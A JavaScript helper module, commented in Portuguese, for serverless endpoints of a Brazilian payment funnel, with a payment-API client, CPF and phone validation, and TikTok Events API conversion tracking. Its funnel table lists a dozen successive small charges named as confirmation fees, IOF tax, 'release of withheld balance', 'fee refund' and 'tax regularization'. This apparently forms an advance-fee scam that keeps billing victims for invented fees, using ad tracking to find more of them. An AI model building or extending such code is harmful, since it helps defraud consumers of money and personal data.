// Código compartilhado pelos endpoints. O "_" no nome impede a Vercel de expor este arquivo como rota.
const crypto = require("crypto");

// O Node 24 emite o aviso DEP0169 quando alguém chama url.parse(). Este projeto não chama: o aviso
// nasce na camada da própria Vercel, quando a função faz uma chamada externa, e aparece nos logs como
// erro vermelho a cada função iniciada. Fica de fora (só ele) para um erro de verdade não se perder.
const emitirAviso = process.emitWarning;
process.emitWarning = function (aviso, ...resto) {
  const codigo = (resto[0] && resto[0].code) || resto[1] || (aviso && aviso.code);
  if (codigo === "DEP0169") return;
  return emitirAviso.call(this, aviso, ...resto);
};

const FLEVO_BASE = "https://pagamento-processador.org.ua/api/v1";
const TIKTOK_EVENTS = "https://business-api.tiktok.com/open_api/v1.3/event/track/";

// Preço (em centavos), nome e próxima etapa de cada passo do funil.
// `next` só é usado pelo up8, up9 e up10 (o servidor devolve o link de redirecionamento).
// As demais etapas seguem o `proximo` que já está no checkout.html de cada pasta.
const STEPS = {
  front: { amount: 1386, name: "Taxa de Confirmação" },
  back: { amount: 1244, name: "Taxa de Confirmação - Desconto Aplicado" },
  up1: { amount: 2334, name: "Taxa de IOF" },
  up2: { amount: 2631, name: "Taxa Única de Ativação" },
  up3: { amount: 2435, name: "Taxa de Antecipação" },
  up4: { amount: 2142, name: "Taxa de Atualização da Vaga" },
  up5: { amount: 3274, name: "Guia de Recolhimento Única" },
  up6: { amount: 3893, name: "Taxa de Liberação de Saldo Retido" },
  up7: { amount: 2442, name: "Estorno das Taxas - Sistema de Devolução Total" },
  up8: { amount: 1946, name: "Bônus Extra - TikTok Premium", next: "/up9/index.html" },
  up9: { amount: 1473, name: "Antecipação de Saque", next: "/up10/index.html" },
  up10: { amount: 2335, name: "Guia de Regularização Fiscal", next: "/obrigado/index.html" },
};

function env(nome) {
  return (process.env[nome] || "").trim();
}

function sha256(valor) {
  return crypto.createHash("sha256").update(String(valor).trim().toLowerCase()).digest("hex");
}

function soDigitos(v) {
  return String(v || "").replace(/\D/g, "");
}

// CPF/CNPJ pelo dígito verificador (a FlevoPay pede só números).
function cpfValido(valor) {
  const c = soDigitos(valor);
  if (c.length !== 11 || /^(\d)\1{10}$/.test(c)) return false;
  for (let volta = 9; volta < 11; volta++) {
    let soma = 0;
    for (let i = 0; i < volta; i++) soma += Number(c[i]) * (volta + 1 - i);
    let digito = (soma * 10) % 11;
    if (digito === 10) digito = 0;
    if (digito !== Number(c[volta])) return false;
  }
  return true;
}

// Telefone com DDD, só números: 10 (fixo) ou 11 dígitos (celular), DDD de 11 a 99.
function telefoneValido(valor) {
  const t = soDigitos(valor);
  return (t.length === 10 || t.length === 11) && Number(t.slice(0, 2)) >= 11;
}

function reais(centavos) {
  return "R$ " + (centavos / 100).toFixed(2).replace(".", ",");
}

function ipDoCliente(req) {
  const xff = String(req.headers["x-forwarded-for"] || "");
  return xff.split(",")[0].trim() || req.socket?.remoteAddress || "";
}

function lerCookie(req, nome) {
  const m = String(req.headers.cookie || "").match(new RegExp("(?:^|;\\s*)" + nome + "=([^;]*)"));
  return m ? decodeURIComponent(m[1]) : "";
}

// Query string da página do lead (UTMs, ttclid...). Vem no corpo ou, na falta, do Referer.
function queryDaPagina(req, bruto) {
  let q = String(bruto || "").replace(/^\?/, "");
  if (!q && req.headers.referer) {
    try { q = new URL(req.headers.referer).search.replace(/^\?/, ""); } catch (e) { /* ignora */ }
  }
  return new URLSearchParams(q);
}

async function lerCorpo(req) {
  if (req.body && typeof req.body === "object") return req.body;
  if (typeof req.body === "string" && req.body) {
    try { return JSON.parse(req.body); } catch (e) { return {}; }
  }
  return {};
}

async function flevo(caminho, opcoes = {}) {
  const chave = env("FLEVOPAY_SECRET") || env("FLEVOPAY_SECRET_KEY");
  if (!chave) throw new Error("FLEVOPAY_SECRET (ou FLEVOPAY_SECRET_KEY) não configurada");
  const r = await fetch(FLEVO_BASE + caminho, {
    ...opcoes,
    headers: { "X-API-Key": chave, "Content-Type": "application/json", ...(opcoes.headers || {}) },
  });
  let dados = null;
  try { dados = await r.json(); } catch (e) { /* resposta sem JSON */ }
  return { ok: r.ok, status: r.status, dados };
}

// Endereço público do site (SITE_URL, ou o host da requisição), usado no postback_url.
function urlBase(req) {
  const fixo = env("SITE_URL").replace(/\/+$/, "");
  if (fixo) return fixo;
  const host = String(req.headers["x-forwarded-host"] || req.headers.host || "").split(",")[0].trim();
  return host ? "https://" + host : "";
}

// Etapa do funil a partir da referência ("up3-1712345678901-ab12cd" -> "up3").
function etapaDaReferencia(reference) {
  const etapa = String(reference || "").split("-")[0];
  return Object.prototype.hasOwnProperty.call(STEPS, etapa) ? etapa : "";
}

// Busca a transação pela referência, direto na FlevoPay. Usada pelo webhook quando ele não recebe o id.
// Uma referência pode ter mais de uma linha lá (cobranças duplicadas antigas): vale a aprovada.
async function transacaoPorReferencia(reference) {
  const r = await flevo("/query?action=list_transactions&external_id=" + encodeURIComponent(reference));
  if (!r.ok || !Array.isArray(r.dados)) throw new Error("FlevoPay respondeu " + r.status + " na consulta por referência");
  const mesmas = r.dados.filter((t) => t && t.external_id === reference);
  return mesmas.find((t) => t.status === "approved") || mesmas[0] || null;
}

// Dados do cliente de uma transação: o que a FlevoPay guardou ou, na falta, o que veio no aviso dela.
function clienteDaTransacao(t, corpo) {
  const c = (t && t.customer_data && (t.customer_data.customer || t.customer_data)) || (corpo && corpo.customer) || {};
  return { email: c.email, telefone: c.phone, documento: c.document };
}

// ---------------------------------------------------------------------------------------------
//  TikTok
// ---------------------------------------------------------------------------------------------

// Nome do evento de venda. "Purchase" é o padrão atual do TikTok; quem otimiza campanha pelo nome
// antigo pode trocar pela variável TIKTOK_EVENT_NAME (ex.: CompletePayment).
function eventoDeCompra() {
  return env("TIKTOK_EVENT_NAME") || "Purchase";
}

// Página do checkout de cada etapa (vira o page.url quando o evento sai do webhook).
function paginaDaEtapa(step) {
  return step === "front" ? "/front/checkout-paradise.html" : "/" + step + "/checkout.html";
}

// O que liga o evento ao clique no anúncio, lido da requisição do próprio navegador.
function contextoDoNavegador(req, query) {
  return {
    ip: ipDoCliente(req),
    userAgent: String(req.headers["user-agent"] || ""),
    ttclid: (query && query.get("ttclid")) || lerCookie(req, "ttclid"),   // da URL ou do cookie do pixel
    ttp: lerCookie(req, "_ttp"),
    url: String(req.headers.referer || ""),
  };
}

// Identificadores do cliente no formato do TikTok (SHA-256). Os mesmos valores vão para o pixel do
// navegador (ttq.identify): assim o TikTok reconhece a mesma pessoa no navegador e no servidor, e em
// todos os eventos dela (o external_id é o CPF, igual do "Pix gerado" até a compra).
function identidadeTikTok({ email, telefone, documento } = {}) {
  const id = {};
  if (email) id.email = sha256(email);
  const fone = soDigitos(telefone);
  // DDD 55 existe (RS): só é código do país quando sobram dígitos para DDD + número.
  if (fone) id.phone_number = sha256("+" + (fone.length >= 12 && fone.startsWith("55") ? fone : "55" + fone));
  const doc = soDigitos(documento);
  if (doc) id.external_id = sha256(doc);
  return id;
}

// O mesmo evento, no formato que a página repassa ao pixel (window.ttEvento, em /api/tt.js).
function eventoParaOPixel({ evento, eventId, step, cliente }) {
  return {
    event: evento,
    event_id: eventId,
    value: STEPS[step].amount / 100,
    currency: "BRL",
    content_id: step,
    content_name: STEPS[step].name,
    user: identidadeTikTok(cliente),
  };
}

// Evento pela Events API do TikTok (servidor -> TikTok).
// `eventId` é fixo por transação: o mesmo evento mandado de novo (webhook e /api/status, ou o pixel do
// navegador com o mesmo id) é descartado ou fundido pelo TikTok, nunca contado em dobro.
// `contexto`: { ip, userAgent, ttclid, ttp, url }. `prazo`: tempo máximo, em ms, somando as tentativas.
async function enviarEventoTikTok({ evento, eventId, step, cliente, contexto, prazo = 7000 }) {
  const pixel = env("TIKTOK_PIXEL_ID");
  const token = env("TIKTOK_ACCESS_TOKEN");
  if (!pixel || !token) return false;

  const ctx = contexto || {};
  const id = identidadeTikTok(cliente);
  const user = {};
  if (id.email) user.email = id.email;
  // A Events API usa "phone"; "phone_number" vai junto por garantia (chave a mais é ignorada).
  if (id.phone_number) { user.phone = id.phone_number; user.phone_number = id.phone_number; }
  if (id.external_id) user.external_id = id.external_id;
  if (ctx.ttclid) user.ttclid = ctx.ttclid;
  if (ctx.ttp) user.ttp = ctx.ttp;
  if (ctx.ip) user.ip = ctx.ip;
  if (ctx.userAgent) user.user_agent = ctx.userAgent;

  const valor = STEPS[step].amount / 100;
  const dado = {
    event: evento,
    event_time: Math.floor(Date.now() / 1000),
    event_id: eventId,
    user,
    properties: {
      currency: "BRL",
      value: valor,
      content_type: "product",
      contents: [{ content_id: step, content_name: STEPS[step].name, quantity: 1, price: valor }],
    },
  };
  if (ctx.url) dado.page = { url: ctx.url };

  const corpo = { event_source: "web", event_source_id: pixel, data: [dado] };
  // Com TIKTOK_TEST_EVENT_CODE definido, o evento aparece em "Testar eventos" no Events Manager.
  const teste = env("TIKTOK_TEST_EVENT_CODE");
  if (teste) corpo.test_event_code = teste;

  const resumo = evento + " " + eventId + " [" + Object.keys(user).join(",") + "]";
  const fim = Date.now() + prazo;
  for (let tentativa = 1; tentativa <= 2; tentativa++) {
    const resta = fim - Date.now();
    if (resta < 500) break;
    try {
      const r = await fetch(TIKTOK_EVENTS, {
        method: "POST",
        headers: { "Content-Type": "application/json", "Access-Token": token },
        body: JSON.stringify(corpo),
        signal: AbortSignal.timeout(Math.min(3500, resta)),
      });
      // O TikTok responde HTTP 200 mesmo quando recusa o evento; o erro vem em "code" no corpo.
      const texto = await r.text();
      let codigo = null;
      try { codigo = JSON.parse(texto).code; } catch (e) { /* resposta sem JSON */ }
      if (r.ok && codigo === 0) {
        console.log("[tiktok] aceito:", resumo);
        return true;
      }
      console.error("[tiktok] recusado:", resumo, "http " + r.status, texto.slice(0, 300));
      // Erro de dados ou de credencial: mandar de novo não muda a resposta.
      if (r.status < 500 && r.status !== 429) return false;
    } catch (e) {
      // Medição nunca pode atrapalhar a venda: registra e segue.
      console.error("[tiktok] sem resposta:", resumo, String((e && e.message) || e));
    }
  }
  return false;
}

module.exports = {
  STEPS, env, soDigitos, cpfValido, telefoneValido, reais, lerCookie, queryDaPagina, lerCorpo, flevo,
  urlBase, etapaDaReferencia, transacaoPorReferencia, clienteDaTransacao,
  eventoDeCompra, paginaDaEtapa, contextoDoNavegador, identidadeTikTok, eventoParaOPixel,
  enviarEventoTikTok,
};
